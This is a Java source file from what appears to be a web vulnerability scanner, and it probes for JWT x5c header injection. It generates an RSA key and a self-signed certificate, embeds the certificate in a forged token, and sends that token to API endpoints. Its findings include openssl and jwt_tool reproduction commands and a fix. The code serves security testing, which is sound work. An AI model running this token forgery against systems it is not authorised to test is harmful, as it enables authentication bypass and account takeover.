package gg.effront.anarcry.scanner.crypto.jwt;

import gg.effront.anarcry.model.CvssCalculator;
import gg.effront.anarcry.model.CweRegistry;
import gg.effront.anarcry.model.Finding;
import gg.effront.anarcry.model.Severity;
import gg.effront.anarcry.scanner.ScanContext;
import gg.effront.anarcry.scanner.util.Http;

import org.bouncycastle.asn1.ASN1EncodableVector;
import org.bouncycastle.asn1.ASN1Integer;
import org.bouncycastle.asn1.DERBitString;
import org.bouncycastle.asn1.DERNull;
import org.bouncycastle.asn1.DERSequence;
import org.bouncycastle.asn1.pkcs.PKCSObjectIdentifiers;
import org.bouncycastle.asn1.x500.X500Name;
import org.bouncycastle.asn1.x509.AlgorithmIdentifier;
import org.bouncycastle.asn1.x509.SubjectPublicKeyInfo;
import org.bouncycastle.asn1.x509.Time;
import org.bouncycastle.asn1.x509.V3TBSCertificateGenerator;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.time.Duration;
import java.util.Base64;
import java.util.Date;
import java.util.List;
import java.util.Optional;
import java.util.function.Consumer;

/**
 * Probes x5c header injection: embeds a self-signed certificate in the JWT
 * header and signs the token with the corresponding private key. If the server
 * trusts the attacker-provided x5c chain instead of a pinned CA or key, the
 * token is accepted -- complete auth bypass.
 */
public class X5cChainProbe {

    private static final List<String> AUTH_PATHS = List.of("/api/me", "/api/user", "/api/profile");

    public Optional<Finding> probe(String[] parts, ScanContext ctx, String base, HttpClient hc, Consumer<String> log) {
        log.accept("[~] JWT: probe x5c self-signed certificate injection");
        try {
            // Generate RSA 2048-bit key pair
            KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
            kpg.initialize(2048);
            KeyPair kp = kpg.generateKeyPair();

            // Build self-signed X.509 certificate using BouncyCastle ASN.1 primitives
            byte[] certDer = buildSelfSignedCert(kp);
            String certB64 = Base64.getEncoder().encodeToString(certDer);

            // Build JWT header with x5c array containing the self-signed cert
            String headerJson = "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"x5c\":[\"" + certB64 + "\"]}";
            String forgedHeader = Base64.getUrlEncoder().withoutPadding()
                    .encodeToString(headerJson.getBytes(StandardCharsets.UTF_8));

            // Sign the JWT with the attacker's private key (matches x5c cert)
            String sigInput = forgedHeader + "." + parts[1];
            Signature rsaSig = Signature.getInstance("SHA256withRSA");
            rsaSig.initSign(kp.getPrivate());
            rsaSig.update(sigInput.getBytes(StandardCharsets.UTF_8));
            String sig = Base64.getUrlEncoder().withoutPadding().encodeToString(rsaSig.sign());
            String forgedToken = sigInput + "." + sig;

            log.accept("[~] JWT: x5c token forjado com certificado self-signed, enviando probes");
            for (String path : AUTH_PATHS) {
                try {
                    HttpRequest req = HttpRequest.newBuilder().uri(URI.create(base + path))
                            .header("Authorization", "Bearer " + forgedToken).timeout(Duration.ofSeconds(5)).GET()
                            .build();
                    HttpResponse<Void> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.discarding(), "JWT");
                    log.accept("[~] JWT: x5c " + path + " -> HTTP " + resp.statusCode());
                    if (resp.statusCode() == 200) {
                        String cweId = CweRegistry.cweId("JWT");
                        String cweTitle = CweRegistry.cweTitle("JWT");
                        String cvssVector = CweRegistry.cvssVector("JWT");
                        double score = CvssCalculator.calculate(cvssVector);
                        return Optional.of(Finding.of("JWT", base + path, "x5c self-signed certificate accepted",
                                Severity.CRITICAL,
                                "Probe em " + base + path + " -> HTTP 200 com certificado self-signed no header x5c",
                                "Servidor confia no certificado embutido no token -- atacante pode"
                                        + " gerar qualquer certificado e self-sign tokens" + " arbitrarios",
                                "# 1. Gerar chave + cert:\nopenssl req -x509 -nodes"
                                        + " -newkey rsa:2048 -keyout key.pem -out cert.pem" + " -subj '/CN=attacker'\n"
                                        + "# 2. Forjar token com x5c:\n" + "python3 jwt_tool.py <token> -X x5c"
                                        + " -pk key.pem -pc cert.pem",
                                "Ignorar o campo x5c do header; validar tokens apenas com"
                                        + " certificados pre-configurados no servidor ou via"
                                        + " CA trust chain verificada",
                                cweId, cweTitle, cvssVector, score));
                    }
                } catch (Exception ex) {
                    log.accept("[~] JWT: x5c " + path + " -- " + ex.getMessage());
                }
            }
        } catch (Exception e) {
            log.accept("[~] JWT: x5c -- " + e.getMessage());
        }
        return Optional.empty();
    }

    /**
     * Builds a minimal self-signed X.509 v3 certificate using BouncyCastle ASN.1
     * primitives (bcprov only -- no bcpkix dependency). The certificate is valid
     * for 1 year with a throwaway CN.
     */
    private static byte[] buildSelfSignedCert(KeyPair kp) throws Exception {
        AlgorithmIdentifier sigAlgId = new AlgorithmIdentifier(PKCSObjectIdentifiers.sha256WithRSAEncryption,
                DERNull.INSTANCE);
        X500Name dn = new X500Name("CN=anarcry-probe");
        long now = System.currentTimeMillis();

        V3TBSCertificateGenerator tbsGen = new V3TBSCertificateGenerator();
        tbsGen.setSerialNumber(new ASN1Integer(now));
        tbsGen.setSignature(sigAlgId);
        tbsGen.setIssuer(dn);
        tbsGen.setStartDate(new Time(new Date(now)));
        tbsGen.setEndDate(new Time(new Date(now + 365L * 86400 * 1000)));
        tbsGen.setSubject(dn);
        tbsGen.setSubjectPublicKeyInfo(SubjectPublicKeyInfo.getInstance(kp.getPublic().getEncoded()));

        // Generate TBS structure and sign it
        var tbs = tbsGen.generateTBSCertificate();
        Signature rsaSig = Signature.getInstance("SHA256withRSA");
        rsaSig.initSign(kp.getPrivate());
        rsaSig.update(tbs.getEncoded());
        byte[] sigBytes = rsaSig.sign();

        // Assemble the Certificate structure: SEQUENCE { tbs, sigAlg, sigValue }
        ASN1EncodableVector v = new ASN1EncodableVector();
        v.add(tbs);
        v.add(sigAlgId);
        v.add(new DERBitString(sigBytes));
        return new DERSequence(v).getEncoded();
    }
}
